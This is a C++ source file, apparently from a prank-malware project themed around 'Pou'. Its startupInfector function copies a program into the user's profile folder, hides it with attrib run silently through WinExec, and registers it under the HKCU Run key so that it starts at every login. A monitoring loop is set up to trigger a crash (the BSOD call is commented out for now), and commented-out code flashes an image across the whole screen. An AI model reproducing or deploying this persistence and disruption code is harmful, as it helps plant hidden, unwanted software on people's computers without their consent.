#include "Common.h"


void startupInfector(string file, string newName) {


	string userPath = "C:\\Users\\" + username();
	cout << userPath << endl;

	string fullFilePath = "\"" + userPath + "\\" + newName + "\"";

	cout << fullFilePath;

	copyFile(file, userPath, newName);
	



	string attribCommand = "attrib +H +S +I +R " + userPath + "\\" + newName;



	WinExec(attribCommand.c_str(), SW_HIDE);
	



	setRegestryValue("HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "Pou", "REG_SZ", fullFilePath);

}


void pouVitalsCheck() {
    
	Sleep(2000);

	for (;;) {


		int firstCheck = getNumOfWindows();

		Sleep(10);

		if (firstCheck > getNumOfWindows()) {
			MessageBox(NULL, L"Crash Cancelled\nPayload.cpp : Line 45", L"Warning", MB_OK | MB_ICONWARNING); // Place Holder
			//BSOD();
		}
		
		  

	}

}

/*

void pouSaysHello() {
	//PlaySound(MAKEINTRESOURCE(IDR_WAVE1), GetModuleHandle(NULL), SND_ASYNC | SND_RESOURCE | SND_NOSTOP);

	//for (int i = 101; i < 222; i++) {
		BITMAP bm;

		HBITMAP Picture = reinterpret_cast<HBITMAP>(LoadImage(GetModuleHandle(nullptr), MAKEINTRESOURCEW(IDB_BITMAP1), IMAGE_BITMAP, 250, 250, LR_DEFAULTSIZE));
		
		

		HDC whdc = GetDC(0);
		HDC hdcMem = CreateCompatibleDC(whdc);
		SelectObject(hdcMem, Picture);
		GetObject((HGDIOBJ)Picture, sizeof(bm), &bm);


		for (size_t i = 0; i < 100; i++)
		{



			BitBlt(whdc, 0, 0, bm.bmWidth, bm.bmHeight, hdcMem, 0, 0, SRCCOPY);
			Sleep(2);
			BitBlt(whdc, 0, 0, bm.bmWidth, bm.bmHeight, hdcMem, 0, 0, SRCCOPY);
			Sleep(2);
			BitBlt(whdc, 0, 0, bm.bmWidth, bm.bmHeight, hdcMem, 0, 0, SRCCOPY);

		}
		DeleteDC(hdcMem);
		DeleteObject(Picture);

		//Test2

	//}

}

*/